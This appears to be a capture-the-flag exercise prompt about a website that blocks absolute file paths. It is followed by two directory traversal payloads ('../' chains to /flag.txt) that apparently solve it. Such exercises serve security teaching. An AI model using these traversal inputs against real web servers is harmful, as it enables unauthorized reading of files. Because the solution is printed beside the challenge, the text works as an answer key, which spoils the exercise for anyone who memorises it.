Can you get the flag?
Here's the website.
We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?


../../../../../flag.txt
../../../../../../../../../../../../../flag.txt
